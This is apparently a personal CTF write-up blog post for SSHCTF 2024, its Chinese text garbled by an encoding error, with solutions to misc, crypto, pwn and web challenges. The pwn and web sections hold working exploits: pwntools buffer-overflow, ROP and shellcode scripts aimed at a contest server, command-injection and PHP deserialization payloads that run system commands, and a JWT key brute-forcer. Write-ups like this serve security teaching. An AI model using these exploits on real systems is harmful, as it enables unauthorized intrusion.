---
title: SSHCTF 2024
tags: Writeup
layout: article
mathjax: true
article_header:
  type: cover
  image: https://s2.loli.net/2024/06/06/1nT8trlwv7f3LYp.png
---

ä½ å¥½æˆ‘æ˜¯Minz

<!--more-->
---
## Misc

### ç­¾åˆ°

å¤åˆ¶é¢˜ç›®æè¿°

``` 
SSHCTF{wE1c0m3_2_SSHCTF!}
```

### æ—æ·±æ—¶è§â€¦â€¦ç†Šï¼Ÿ

ç†Šæ›°ï¼šå—·å—·

[ä¸ç†Šè®ºé“/ç†Šæ›°åŠ å¯†](http://hi.pcmoe.net/)

``` 
SSHCTF{ThE-woR1d-Of-enc0diNg-i4-TRuly-f@sCiNaTinNg}
```

### å¯æ˜¯é›ªé£˜è¿›åŒçœ¼

å‘ç°æ–‡æœ¬ä¸­çš„å¥‡æ€ªç©ºæ ¼ã€ç©ºè¡Œå’Œåˆ¶è¡¨ï¼Œå¯èƒ½æ˜¯æ–‡ä»¶éšå†™

é¢˜ç›®åç§°å’Œå›¾ç‰‡åç§°éƒ½ç»™å‡ºäº†hintï¼šé›ªï¼Œå³[SNOW]([The SNOW Home Page (darkside.com.au)](https://darkside.com.au/snow/index.html))

å‚è€ƒæ–‡ç« ï¼š[ç”±ç©ºæ ¼ç­‰ä¸å¯è§å­—ç¬¦ç»„æˆçš„éšå†™_ç©ºç™½æ ¼éšå†™-CSDNåšå®¢](https://blog.csdn.net/qq_51999772/article/details/122418926)

æ‰§è¡Œ`.\SNOW.EXE -C .\flagåœ¨å“ªé‡Œ.txt output`ï¼Œæ‹¿åˆ°flag

``` 
SSHCTF{F1y to mY l0ve L1k3 @ FlAKe in tH3 SToRm}
```

### Angrybots & Bugbots

unityæ—©æœŸç»å…¸demoï¼Œéœ€è¦æ‰¾æ§åˆ¶å°è§£é”å¤§é—¨ï¼Œè¿‡ä¸‰é“é—¨åå°±é€šå…³äº†ï¼ˆå°±æ˜¯ç©æ¸¸æˆï¼‰

![](https://s2.loli.net/2024/11/14/NfWh45SiKOGRnpj.png)


``` 
flag1
SSHCTF{4n9rYbOts_1!5!_@w3S0me!}
```

è¿™ä¸ªåœ°æ–¹å¯ä»¥æ‰ä¸‹å»ï¼Œåˆ°è¾¾ä¸–ç•Œæœ€ä½åŸ

![](https://s2.loli.net/2024/11/14/XLWSAyVd1oQ5ODK.png)

æˆ–è€…è¿›æ¸¸æˆå¾€å³ä¸‹è§’èµ°ï¼Œéšä¾¿èµ°èµ°å°±èµ°å‡ºå»äº†

![](https://s2.loli.net/2024/11/14/bMYNzEL6rvPtFfD.png)

![](https://s2.loli.net/2024/11/14/BMaxfGKnkwAJ28V.png)

``` 
flag2
SSHCTF{bU9_1n_Tim3m@chInE}
```

### Snowy Screen

é¢˜ç›®ç»™äº†ä¸€ä¸ªgifï¼Œè‡ªç„¶å…ˆæŠŠå¸§éƒ½æ‹†å‡ºæ¥` convert snowy.gif snowy.png`æ‹†å‡º400ä¸ªå›¾ç‰‡

å‘ç°æœ‰ä¸ªå°é»‘å­snowy-379.pngæ˜¯ä¸€ä¸ªäºŒç»´ç ï¼Œä½†æ‰«æåä»…å¾—åˆ°ä¸€åŠflag

![](https://s2.loli.net/2024/11/14/y2hKWoeGlafM6sL.png)

``` 
_with_sn0wy_sCreeN}
```

æ ¹æ®hint: ä¼¼ä¹æœ‰æŸç§æ’åˆ—æ–¹å¼ï¼ŒğŸğŸğŸ =ã€‹è›‡å½¢æ’åº

å›¾ç‰‡æœ‰400å¼ ï¼Œå¯ä»¥æ‹¼æˆ20*20çš„ä¸€ä¸ªæ­£æ–¹å½¢

ç”¨pythonæ‹¼æ¥å›¾ç‰‡

```python
from PIL import Image

png_files = [f'snowy-{i}.png' for i in range(400)] # å›¾ç‰‡å’Œ.pyæ”¾åœ¨åŒä¸€ä¸ªæ–‡ä»¶å¤¹äº†
img_size = 50
grid_size = 20
new_img = Image.new('RGB', (img_size * grid_size, img_size * grid_size))

for index, file in enumerate(png_files):
    img = Image.open(file)
    row = index // grid_size # å½“å‰è¡Œå·
    if row % 2 == 0:
        col = index % grid_size # å½“å‰åˆ—å·ï¼Œæ¯è¡Œæ–¹å‘äº¤æ›¿
    else:
        col = grid_size - 1 - (index % grid_size)

    x = col * img_size
    y = row * img_size
    new_img.paste(img, (x, y))

new_img.save('combined_snake_pattern_image.png')
```

å¾—åˆ°æ‹¼æ¥åå›¾ç‰‡

![](https://s2.loli.net/2024/11/14/ivTWMdkFgm7Kw6s.png)

å†ä¸ä¸‹åŠéƒ¨åˆ†flagåˆå¹¶

``` 
SSHCTF{H4ving_fun_with_sn0wy_sCreeN}
```

### See What You Heard

å°†mp3ç”¨Audacityæ‰“å¼€ï¼Œçœ‹åˆ°æŸä¸€æ®µéŸ³é¢‘æœ‰é•¿æœ‰çŸ­æœ‰ç©ºæ ¼ï¼Œæ‘©æ–¯å¯†ç 

![](https://s2.loli.net/2024/11/14/sMV8PItXOxbJL3y.png)

Codeï¼š` -.-- --- ..- -.-. .- -. ... . . ... --- ..- -. -.. ...`

åˆ°[CyberChef ](https://gchq.github.io/CyberChef/)è§£ç ï¼Œå¾—åˆ°flag

``` python
SSHCTF{YOUCANSEESOUNDS}
```

### LSBæ‚Ÿç©º

æ ¹æ®hintï¼šLSBéšå†™ï¼Œå°†å›¾ç‰‡ç”¨StegSolveæ‰“å¼€ï¼ŒæŸ¥çœ‹å„ä¸ªé€šé“ï¼Œåœ¨Red plane 0å‘ç°ä¸€ä¸ªäºŒç»´ç 

![](https://s2.loli.net/2024/11/14/f5RTPBSojx3JCkr.png)

``` 
SSHCTF{L5B&QRc0de_ArE_1ntereSing}
```

### æ¥å—å®ŒåŒ–å§

ä¸€å¼€å§‹å°è¯•å­¦ä¹ ç¿»è¯‘Phyrexia Language ...... å°è¯•å¤±è´¥

ç›´æ¥googleæœå›¾ï¼Œå¾—åˆ°ç»“æœ [A Breakthrough in Phyrexian Language and Communications](https://magic.wizards.com/en/news/feature/a-breakthrough-in-phyrexian-language-and-communications)

![](https://s2.loli.net/2024/11/14/eGoC4Vs7HDbvWOP.png)

``` 
SSHCTF{all_will_be_one}
```

### ç½‘ç»œè¿·è¸ª

è½¦è¾†é å·¦è¡Œé©¶ï¼Œè½¦ç‰Œç™½è‰²ï¼Œè½¦ç‰Œå·29-34æ˜¯4ä½æ•°å­—ä¸”ä¸­é—´æœ‰ä¸€æ¨ªçº¿ï¼Œæ¨æµ‹æ˜¯æ—¥æœ¬

èƒŒæ™¯æœ‰"Balenciaga"ç­‰å›½é™…å¥¢ä¾ˆå“ç‰Œï¼Œä¸”æœ‰è·‘è½¦ï¼Œåœ¨ä¸œäº¬é“¶åº§æ¯”è¾ƒå¸¸è§

ä¸œäº¬é“¶åº§ä½äºä¸­å¤®åŒº

``` 
SSHCTF{æ—¥æœ¬_ä¸œäº¬_ä¸­å¤®åŒº}
```

### SSHjail

æœ‰ä¸¤ä¸ªé€šé“ï¼Œé€šè¿‡é€šé“1æ‹¿åˆ°Kï¼Œä½†æœ‰7å­—ç¬¦é™åˆ¶ï¼Œ`print(K)`æ˜¯8å­—ç¬¦

é‚£ä¹ˆè¿™é‡Œå¯ä»¥ç”¨`help(K)`ï¼Œæ‹¿åˆ°K = authorSmera1d0798

![](https://s2.loli.net/2024/11/14/qxKsREZ58LtjXn3.png)
ç”¨é€šé“2ï¼Œè·å–flag

- å…ˆ`print(__import__('os').listdir('/'))` 

  ![](https://s2.loli.net/2024/11/14/yEXtkLhug17B9zb.png)

  æ‰¾åˆ°flagåœ¨æ ¹ç›®å½•

- æ‰“å°flag `print(__import__('os').system('cat /flag'))`

  ![](https://s2.loli.net/2024/11/14/yqGMSVcixJmOwAR.png)

``` 
SSHCTF{PYjaiI_I5_so_COOoL_f74c2e03736f}
```

## Crypto

### O.o ä½ æ²¡æœ‰å­¦è¿‡é«˜ä¸­æ•°å­¦å—

è¿™æ˜¯ä¸ªRSAè§£å¯†ï¼Œæç¤ºè¯´æ˜¯é«˜ä¸­æ•°å­¦ï¼Œä¸”æœ‰ $$ p^2 + q^2 >= hint2 $$

è¿™ä¸ªå˜é‡å‘½åä¸ºhintè®¤ä¸ºæ˜¯æœ‰åŸå› çš„ï¼Œæ‰€ä»¥ $$ p^2 + q^2 = 2pq = hint2 $$ ï¼ˆå‡è®¾æ˜¯è¿™æ ·ï¼‰

ç”¨pythonè§£på’Œqï¼Œç„¶åè§£å¯†

```python
from Cryptodome.Util.number import *
import sympy
import math
from decimal import Decimal, getcontext

e = 65537
c = 920 ... 619
hint1 = 654 ... 866
hint2 = 130 ... 194
# è§£æ–¹ç¨‹è®¡ç®—på’Œq
ch = 2 * hint1 - hint2
ch1 = ch // 6
ch2 = hint2 // 2
getcontext().prec = 100
delta = (ch1-1) * (ch1-1) - 4 * ch2
delta = Decimal(delta)
sqrt_delta = int(delta.sqrt())
numerator1 = ch1 - 1 + sqrt_delta
numerator2 = ch1 - 1 - sqrt_delta
p = numerator1 // 2
q = numerator2 // 2
# RSAè§£å¯†
n = p * q
d = inverse(e, (p-1) * (q-1))
m = pow(c, d, n)
flag = long_to_bytes(m)
print(flag)

# SSHCTF{Y0u_4r3_a_g00d_h1gh_sch00l_stud3n7}
```

### é‚£äº›å¹´ï¼Œæˆ‘ä»¬å›ä¸å»çš„é«˜ä¸­

ç”¨LCGåŠ å¯†flagï¼Œçº¿æ€§åŒä½™ç”Ÿæˆå™¨ï¼š$$ seed = (a * seed + b)\mod n $$

è®¡ç®—å¯èƒ½çš„nå€¼ï¼Œå¯¹åº”è§£å‡ºaå’Œbï¼Œç„¶åå°è¯•è§£å¯†

```python
from Cryptodome.Util.number import *
from math import gcd
s = [ ... ]

# è®¡ç®—æ¨¡é€†å…ƒ
def mod_inverse(a, n):
    g, x, y = gcd_extended(a, n)
    return x % n

def gcd_extended(a, b):
    if b == 0:
        return a, 1, 0
    g, x1, y1 = gcd_extended(b, a % b)
    x = y1
    y = x1 - (a // b) * y1
    return g, x, y


# è®¡ç®—å·®å¼‚
t = [s[i] - s[i - 1] for i in range(1, len(s))]

# è®¡ç®—å¯èƒ½çš„nå€¼
all_n = set(gcd(t[i + 1] * t[i - 1] - t[i] * t[i], t[i + 2] * t[i] - t[i + 1] * t[i + 1]) for i in range(1, len(t) - 2))

# è§£å¯†nå€¼
for n in all_n:
    n = abs(n)
    a = (s[2] - s[1]) * mod_inverse((s[1] - s[0]), n) % n
    b = (s[1] - a * s[0]) % n
    seed = mod_inverse(a, n) * (s[0] - b) % n
    plaintext = seed
    print(long_to_bytes(plaintext))
    
# SSHCTF{Stre@m_CipHer_1S_S0OO_ColL!}
```

### å±±æœ‰å³°é¡¶ æµ·æœ‰å½¼å²¸

ç”¨çŸ©é˜µåŠ å¯†çš„ï¼Œå…¶å®å°±æ˜¯Hill Cipheræ¢äº†ä¸ªnï¼Œä¾æ—§æ˜¯C = P x K mod nçš„è§£æ³•

ç”¨sagemathè§£å‡º

```python
import numpy as np
known_flag = b'The course of ... bu'
known_flag = list(known_flag)
known_flag = np.array([known_flag[i:i+4] for i in range(0, 160, 4)])
cipher_hex = '462b2653 ... 17456'
cipher = bytes.fromhex(cipher_hex)
cipher = list(cipher)
known_cipher = cipher[:160]
known_cipher = np.array([known_cipher[i:i+4] for i in range(0, 160, 4)])
four_block_flag = Matrix(known_flag[:4])
four_block_cipher = Matrix(known_cipher[:4])
fdet_inv_mod = inverse_mod(four_block_flag.det() % 127, 127)
# æ±‚Keyçš„æ¨¡é€†çŸ©é˜µ
f_sub = four_block_flag.adjugate()
f_inv_mod = Matrix(ZZ, (fdet_inv_mod * f_sub) % 127)
Key = f_inv_mod * four_block_cipher % 127
Key_det_inv_mod = inverse_mod(Key.det() % 127, 127)
Key_sub = Key.adjugate()
Key_inv_mod = Matrix(ZZ, (Key_det_inv_mod * Key_sub) % 127)
Key_inv_mod = np.array(Key_inv_mod)
# cipher -> plaintext
cipher = np.array([cipher[i:i+4] for i in range(0, len(cipher), 4)])
flag = []
for c in cipher:
    c = np.array(c)
    p = np.matmul(c, Key_inv_mod) % 127
    flag += p.tolist()
print(''.join([chr(c) for c in flag]))

# SSHCTF{CTF_is_r0mant1c!}
```

### Cignin

ç­¾åˆ°é¢˜ï¼Œé€†ç€æ¨å¯¼å³å¯

```python
from Cryptodome.Util.number import GCD, long_to_bytes, inverse

# ç»™å‡ºçš„å€¼
pq = 939 ... 147
pr = 755 ... 913
key1 = 179 ... 245
c = 288 ... 400
# pæ˜¯pqå’Œprçš„æœ€å¤§å…¬å› æ•°
p = GCD(pq, pr)
q = pq // p
r = pr // p
# è§£å¯†m
m = (c * inverse(key1, p)) % p
# ä»longå›åˆ°bytes
flag = long_to_bytes(m)
print(flag)

# SSHCTF{Welcome_to_the_world_of_cryptography!cf1c8c33db2050e4}
```

### æ­»å»çš„ä¹çœè”è€ƒåˆåœ¨æ”»å‡»æˆ‘

é€šè¿‡è§‚å¯Ÿä¸éš¾å‘ç°ï¼Œm1å’Œm2å’Œm3ä¹‹é—´å­˜åœ¨ abs(m1 - m2) == m3

è¿™é‡Œå‡è®¾m1 > m2ï¼Œåˆ™æœ‰
$$
m_3 = m_1 - m_2
$$

$$
c_3 = a^{m_3}\mod p
$$

$$
c_3 = a^{m1-m2} \mod p
$$

$$
c_3 = c_1 * c_2^{-1} \mod p
$$

```python
p = è·å–åˆ°çš„ç´ æ•°p
# å¦‚æœm1 > m2ï¼Œåˆ™c1 = c1, c2 = c2
# å“ªä¸ªcå¯¹åº”çš„må¤§å“ªä¸ªæ”¾åœ¨c1
c1 = è·å–åˆ°çš„c1ï¼Œc2ä¸­çš„å…¶ä¸­ä¸€ä¸ª
c2 = è·å–åˆ°çš„c1ï¼Œc2ä¸­çš„å…¶ä¸­ä¸€ä¸ª

# è®¡ç®—æ¨¡é€†å…ƒ
def mod_inverse(c2, p):
    gcd, x, y = extended_gcd(c2, p)
    return x % p

def extended_gcd(a, b):
    if a == 0:
        return b, 0, 1
    gcd, x1, y1 = extended_gcd(b % a, a)
    x = y1 - (b // a) * x1
    y = x1
    return gcd, x, y

inverse_c2 = mod_inverse(c2, p)
c3 = (c1 * inverse_c2) % p
print(c3)

# SSHCTF{d05c273e-5dd6-4b84-aae5-76afc674179c}
```

### ä¸ºä»€ä¹ˆä¸æç¤ºæˆ‘å¯†ç åˆ°åº•å“ªå‡ ä½é”™äº†

å°±æ˜¯çŒœæ•°å­—ï¼Œç­–ç•¥ï¼š

å…ˆçŒœä¸ª123456ï¼Œç»¿è‰²ä¸åŠ¨ï¼Œé»„è‰²ç§»åˆ°ä¸‹ä¸€ä½ï¼Œç°è‰²æ¢æ•°

å¾ªç¯çŒœï¼ŒçŒœé”™é‡æ¥

``` 
SSHCTF{cc8afa9b-600a-4e4d-9c1f-d3532f6ecf97}
```

### baby_ecc

æ ¹æ®åŠ å¯†ä»£ç å®šä¹‰æ¤­åœ†ï¼Œå¹¶ä¾æ¬¡è§£ç xï¼Œkeyï¼Œflagå³å¯ï¼ŒsagemathçœŸå¥½ç”¨ï¼ˆ

``` python
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from Crypto.Util.number import long_to_bytes
p = 187188301035740794158966814748536811423
ecc = EllipticCurve(GF(p), [5, 2, 1, 1, 7])
g = ecc(202 ... 715, 511 ... 079)
cipher = b'4\x8a ... \xe0'
c_p = ecc(133 ... 821, 574 ... 950)
x = c_p.log(g)
key = long_to_bytes(Integer(x), 16)
aes = AES.new(key, AES.MODE_ECB)
flag = unpad(aes.decrypt(cipher), 16)
print(flag)

# SSHCTF{5m0OtH_0rD3R_ShoU16_be_@voI6Ed!2c1bc9546d949637}
```

## Pwn

### å›ä¸å»çš„ä½•æ­¢é‚£å¹´å¤å¤©

ç”¨idæ‰“å¼€ï¼Œçœ‹åˆ°æœ‰ä¸ªå‡½æ•°Time_machineè¿”å›äº†shellï¼ŒæŸ¥åˆ°å®ƒçš„åœ°å€ï¼Œexpç›´æ¥æ‰“

``` python
from pwn import *
context.log_level = 'debug'
context.binary = 'summer'
#sh = process('./summer')
sh = remote('210.44.150.15', 45024)

offset = 0x7a + 8
time_machine_addr = 0x000000000004011DE
payload = b'a' * offset + p64(time_machine_addr)

sh.sendline(b'yes')
sh.sendline(payload)
sh.interactive()
```

![](https://s2.loli.net/2024/11/14/9fs6DInUmP7uTGK.png)

```
SSHCTF{I_R3AI1y_10v3_y0U_dd9530e8f362}
```

### é‚»åº§LinuxåŒå­¦ä¸æ—¶ç”¨å‘½ä»¤å·å·çœ‹æˆ‘çš„flag

ncè¿æ¥ç›´æ¥æ‹¿shellï¼Œç›¸å½“äºç›´æ¥æ‹¿flagäº†

``` 
SSHCTF{7H3_b39iNnlnG_01_tHl5_w0R1d_f57741fdfac3}
```

### Blackjack

ç¬¬ä¸€å±€é€‰æ‹©16åˆ†all inï¼Œä¸€ç›´HITè¶…è¿‡21ç‚¹è¾“æ‰æ¯”èµ›ï¼Œæ­¤æ—¶åˆ†æ•°æ¥åˆ°äº†0åˆ†

ç¬¬äºŒè½®åˆ†æ•°è¾“å…¥-1ï¼Œè¿™å±€è¦èµ¢ï¼ˆè¾“äº†å°±é‡æ¥ï¼‰

èµ¢äº†ä¹‹åï¼Œç”±äºscoreå­˜å‚¨ç±»å‹æ˜¯unsingedï¼Œæ‰€ä»¥æœ€ç»ˆåˆ†æ•°æå¤§ï¼Œæ‹¿åˆ°flag

![](https://s2.loli.net/2024/11/14/WPIxswat9DQqev3.png)

``` 
SSHCTF{a_H4ckEr_Sto1e_mY_f1A9_w17H_a_ne6ATlvE_w46ER_3ab2029b8e4d}
```

### Overflow_key

1. checksecæ£€æµ‹ï¼Œæ˜¯å°ç«¯åºï¼Œçœ‹å®Œhintçš„ä¸‰ä¸ªè§†é¢‘ï¼Œå†åŠ ä¸Šæ•°ç»„æº¢å‡ºï¼Œå°±çŸ¥é“æ€ä¹ˆåšäº†ã€‚ç”¨idaæ‰“å¼€ï¼š

   ``` 
    buf: 7å­—èŠ‚ï¼Œå‰4ä¸ªå¿…é¡»æ˜¯'root'
    v5: bufå­—èŠ‚æ•°
    v4: 10å­—èŠ‚ï¼Œè¯»å–åˆ°çš„ä¸‹ä¸€ä½è®¾ç½®ä¸º0ï¼Œæœ¬èº«ä»…æœ‰char[6]ï¼Œå­˜åœ¨æ•°ç»„æº¢å‡º
    v4: å‰6å­—èŠ‚å†™åœ¨äº†v4ï¼Œå
    check(v4, v5): v4å‰å››ä½æ˜¯aaaaï¼Œä¸”v5=257
   ```

2. å°ç«¯åºå­˜å‚¨æ˜¯ä½ä½å­—èŠ‚å­˜ä½åœ°å€ï¼Œé«˜ä½å­—èŠ‚å­˜é«˜åœ°å€ï¼Œæ ¹æ®v5å’Œv4å­˜å‚¨çš„ç›¸å¯¹ä½ç½®ï¼Œå¾—åˆ°pwd

   ```
   low -----------------------------------------> high (addr)
   loc 01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 16
   v5                    01 01 00 00 00 00 00 00
   pwd 61 61 61 61 00 00 01 01 00 00 00 00 00 00 00
   ```

3. è·å–shell

   ```python
   from pwn import *
   context.log_level = 'debug'
   context.binary = 'terminal'
   #sh = process('./terminal')
   sh = remote('210.44.150.15', 25354)
   username = b'root'
   password = b'aaaa\x00\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00'
   # v5 = 257 = 0x101
   # password(v4) = aaaa = 0x61616161
   
   sh.recvuntil(b'Username:')
   sh.sendline(username)
   sh.recvuntil(b'Password:')
   sh.sendline(password)
   sh.interactive()
   ```

![](https://s2.loli.net/2024/11/14/aGKIn8cp4PNOhEZ.png)

``` 
SSHCTF{NEvER_7AKE_0v3rFIow_IIgH7ly_e9a3d549a38e}
```

### Signin

ncè¿æ¥ç›´æ¥æ‹¿flagï¼ˆæ€ä¹ˆæ„Ÿè§‰å‰é¢è¯´äº†ä¸€æ¬¡ï¼‰

``` 
SSHCTF{wELC0ME_70_7h3_WOr1D_of_PwN_858132a91ebd}
```

### æœ€åçš„ä¸€é¢ä»¥é—æ†¾ç»“å°¾

1. checksecï¼ŒNX enabled

   ``` 
   # checksec last
       Arch:       amd64-64-little
       RELRO:      Partial RELRO
       Stack:      No canary found
       NX:         NX enabled
       PIE:        No PIE (0x400000)
       SHSTK:      Enabled
       IBT:        Enabled
       Stripped:   No
   ```

   ç”¨idaæ‰“å¼€ï¼Œå‘ç°æœ‰ `result()` æ‰§è¡Œäº† `system("echo \"I want to say I love you.\"")`ï¼Œä½†å¹¶ä¸æ˜¯`/bin/sh`

   åˆ©ç”¨ropgadgetæŸ¥çœ‹æ˜¯å¦å­˜åœ¨/bin/sh

   ``` 
   ROPgadget --binary last --string '/bin/sh'
   Strings information
   ============================================================
   0x0000000000404050 : /bin/sh
   ```

   ç¡®å®å­˜åœ¨ï¼Œä¸”idaå†…æ‰¾åˆ°_systemçš„åœ°å€ä¸ºï¼š

   ``` 
   .plt.sec:0000000000401090 ; int system(const char *command)
   ```

   å› ä¸ºæ˜¯64ä½ï¼Œå‡½æ•°çš„å‚æ•°ä¼ é€’ä½¿ç”¨å¯„å­˜å™¨ï¼Œç¬¬ä¸€ä¸ªå‚æ•°åœ¨rdié‡Œé¢ï¼Œæ‰€ä»¥å…ˆç”¨ pop rdi ret æŠŠ `/bin/sh` å­—ç¬¦ä¸²çš„åœ°å€æ”¾åœ¨rdiç„¶åè°ƒç”¨systemå‡½æ•°

   åŒæ ·ç”¨ropgadgetæŸ¥çœ‹pop rdiå’Œretçš„åœ°å€

   ``` 
   # ROPgadget --binary last | grep "pop rdi"  
   0x0000000000401241 : pop rdi ; ret
   
   # ROPgadget --binary last | grep "ret"    
   0x000000000040101a : ret
   ```

2. expï¼Œç›´æ¥è¿”å›æ‰§è¡Œsystemå‡½æ•°ï¼Œè·å–åˆ°shell

   ``` python
   from pwn import *
   context.log_level = 'debug'
   context.binary = 'last'
   #sh = process('./last')
   sh = remote('210.44.150.15', 41158)
   elf = ELF('./last')
   system_plt = elf.plt['system']
   pop_rdi = 0x401241
   ret = 0x40101a
   binsh_addr=0x404050
   offset = 0x10 + 8
   payload = b'a' * offset + p64(pop_rdi) + p64(binsh_addr) + p64(ret) + p64(system_plt)
   sh.recv()
   sh.sendline(payload)
   sh.interactive()
   ```

![](https://s2.loli.net/2024/11/14/Vwa7h2N3xbpfl8v.png)

``` 
SSHCTF{lf_yOU_TRuly_L0Ve_heR_137_HER_Know_74aa73aa8cea}
```

### babyshellcode

1. checksecï¼Œæ²¡æœ‰ä¿æŠ¤ã€‚æœ¬åœ°æ‰§è¡Œbabyshellcodeï¼Œå‘ç°éœ€è¦è¾“å…¥ä¸¤æ¬¡ï¼Œç¬¬ä¸€æ¬¡è¾“å…¥shellcodeï¼Œç¬¬äºŒæ¬¡æç¤º'opportunity to get shell access'ï¼Œå¤§æ¦‚æ˜¯æ ˆæº¢å‡ºè¿”å›åˆ°shellcodeåœ°å€

2. expï¼Œè·å–åˆ°shell

   ```python
   from pwn import *
   context.log_level = 'debug'
   context.binary = 'babyshellcode'
   #sh = process('./babyshellcode')
   sh = remote('210.44.150.15', 23952)
   sh.recvuntil(b'shellcode:')
   shellcode = asm(shellcraft.sh())
   sh.sendline(shellcode)
   
   addr = 0x601280
   offset = 0x10 + 8
   payload = b'a' * offset + p64(addr)
   sh.recvuntil(b'access.')
   sh.sendline(payload)
   sh.interactive()
   ```

![](https://s2.loli.net/2024/11/14/DAVdaMgvWHGhuKQ.png)

``` 
SSHCTF{SHE11C0dE_HE1Ps_YOU_9E7_5HElL_cad5fe5d2704}
```

## Web

### php-intro

ç”¨burpsuiteæ‹¦æˆªï¼ˆå‘é€åˆ°repeateræ–¹ä¾¿å†æ¬¡æ›´æ”¹ï¼‰

1. ç¬¬ä¸€å…³ï¼ŒGETå’ŒPOST
   - GETï¼š`/?first=new%20to%20SSHCTF`
   - POSTï¼šæ”¹æˆ POST ï¼šåœ¨è¯·æ±‚å¤´ä¸­åŠ ä¸Š `Content-Type: application/x-www-form-urlencoded`ï¼Œå†åœ¨è¯·æ±‚å¤´åç©ºä¸€è¡Œ, å†™ä¸Š `second=CTFer`
2. ç¬¬äºŒå…³ï¼ŒCOOKIE
   - æ·»åŠ ä¸¤ä¸ªcookieï¼š`user=linnco; password=123456`
3. ç¬¬ä¸‰å…³ï¼Œç»•è¿‡md5
   - GETï¼šå†åŠ ä¸Š`&a[]=1&b[]=2`

![](https://s2.loli.net/2024/11/14/DjaFtJGRTlu1oIB.png)

``` 
SSHCTF{e0cfcd98cb09}
```

### Why not ping?

éšä¾¿pingä¸€ä¸ªipï¼Œæœ‰å›æ˜¾ï¼Œå°è¯•åˆ—å‡ºæ–‡ä»¶ç›®å½•

è¾“å…¥`127.0.0.1;ls`ï¼Œå¾—åˆ°flag.txtåœ¨æ­¤ç›®å½•

è¾“å…¥`127.0.0.1;cat flag.txt`ï¼Œæ‹¿åˆ°flag

![](https://s2.loli.net/2024/11/14/glpM2rYAaHFnRLB.png)

``` 
SSHCTF{98d22575-a26d-48b0-9452-549433760b64}
```

### Baby Unserialize

ä¼ªé€ ä¸€ä¸ª$userå¯¹è±¡ï¼Œåºåˆ—åŒ–åbase64ç¼–ç ï¼Œä½œä¸ºcookieè®¿é—®é¡µé¢

å…ˆè¯•è¯•phpinfo();

```php
<?php
class sshctf{
    public $in = true;
    public $cmd = "phpinfo();";
}

$cookie = base64_encode(serialize(new sshctf()));
echo $cookie;
?>
# Tzo2OiJzc2hjdGYiOjI6e3M6MjoiaW4iO2I6MTtzOjM6ImNtZCI7czoxMDoicGhwaW5mbygpOyI7fQ==
```

æˆåŠŸpassï¼Œå°†`$cmd`çš„å€¼è®¾ä¸º`system('find / -name *flag*')`ï¼Œå¾—åˆ°flagåœ¨/usr/local/etc/flag.txt

æ‰§è¡Œ`system('cat /usr/local/etc/flag.txt')`ï¼Œå¾—åˆ°flag

![](https://s2.loli.net/2024/11/14/z9CowMYuVdntxiQ.png)

``` 
SSHCTF{58e9ff21-3327-4d31-a4a3-d1662095cb20}
```

### ezphp

hintï¼šæŸ¥çœ‹robots.txtå’Œåˆ©ç”¨implodeå‡½æ•°

æŸ¥çœ‹/robots.txtï¼Œæœ‰ä¸€ä¸ªphphpp.phpï¼Œè®¿é—®phphpp.php

- GETï¼š`?cover=a[0]=implode&c=sys&d=tem&b=cat /flag`

`parse_str($cover);` ä¼šå°†coverçš„å€¼ä½œä¸ºphpä»£ç è§£æ

æ ¹æ®hintè¦ç”¨implodeï¼Œæ‰€ä»¥éœ€è¦`$a[0] = implode`ï¼Œæ¨å‡º`cover=a[0]=implode`

`$c` å’Œ `$d` æ˜¯implodeçš„å‚æ•°ï¼Œä¸¤ä¸ªæ‹¼èµ·æ¥æ˜¯systemå³å¯ï¼Œè¿™é‡Œç”¨`c=sys&d=tem`

`$b` æ˜¯systemè¦æ‰§è¡Œçš„æŒ‡ä»¤ï¼Œ`d=cat /flag`

![](https://s2.loli.net/2024/11/14/nu4mD6kd9NB53oe.png)

``` 
SSHCTF{0021a89a-1f09-4747-85ea-f55702b7f257}
```

### é’±åŒ…å±æœº

è®¿é—®/robots.txtï¼ŒæœåŠ¡å™¨é’±åŒ…è¯¦æƒ…åœ¨/waaaalllllleettttï¼Œå¾—åˆ°è¿œç¨‹åœ°å€ï¼Œå¹¶ä¸”è¿œç¨‹é’±åŒ…ä½™é¢ä¸º100ï¼Œéœ€è¦101æ‰èƒ½å¤Ÿ/buyFlag

æ‰€ä»¥å°è¯•å‘è¿œç¨‹é’±åŒ…å‘é€1ä¸ªï¼Œè¿™è‡ªç„¶æ˜¯ä¸è¢«å…è®¸çš„çš„ï¼Œæœ¬åœ°é’±åŒ…ä½™é¢ä¸è¶³

æ•…ç”¨burpsuiteæ‹¦æˆªï¼Œä»è¿œç¨‹é’±åŒ…è·å–-1ä¸ªcoinï¼ŒæˆåŠŸï¼ŒæŸ¥çœ‹æœåŠ¡å™¨é’±åŒ…ä½™é¢ï¼Œå˜æˆ101äº†

ä¹‹åä»è¿œç¨‹é’±åŒ…åˆ†åˆ«è·å–50 51ï¼ˆæœ‰å•æ¬¡é™é¢ï¼‰ï¼ŒbuyFlag

![](https://s2.loli.net/2024/11/14/VZYlBDrtWMAdTpK.png)

``` 
SSHCTF{3ff7b1d1-08e5-49c4-a02a-1dc274bb031c}
```

### madSQL

æ³¨æ„åˆ°hint: jwt first

æ­£å¸¸ç™»å½•(Guest)ç”¨burpsuiteè·å–åˆ°éšä¾¿ä¸€ä¸ªjwt

æˆ‘å¾—åˆ°çš„æ˜¯eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZGVudGl0eSI6Imd1ZXN0IiwiZXhwIjoxNzI0NjE4NTg3fQ.Ce96_mDr2FkPVeN51Z-rNTrFFUzImMP1el_yIINgFJg

F12å‘ç°try brute forceçš„hintï¼Œæ•…ç”¨pythonæš´åŠ›ç ´è§£

å…ˆç”¨[pydictor](https://github.com/LandGrey/pydictor)ç”Ÿæˆäº†1-6ä½æ•°å­—å¯†ç nums.txtï¼ˆè¿™é¢˜ä¸ç”¨ä¹Ÿè¡Œï¼‰ï¼Œç„¶åæ‰§è¡Œpythonç¨‹åº

```python
import jwt

def runblasting(path, jwt_str):
    alg = 'HS256'
    with open(path, 'rb') as f:
        for line in f:
            key_ = line.strip()
            print('use' + key_.decode('utf-8'))
            try:
                jwt.decode(jwt_str, verify=True, key=key_, algorithms=alg)
                print('found key! --> ' + key_.decode('utf-8'))
                break
            except:
                continue
            else:
                print('key not found!')
# nums.txt : 1-6ä½æ•°å­—
runblasting('nums.txt', 'eyJ ... FJg')
```

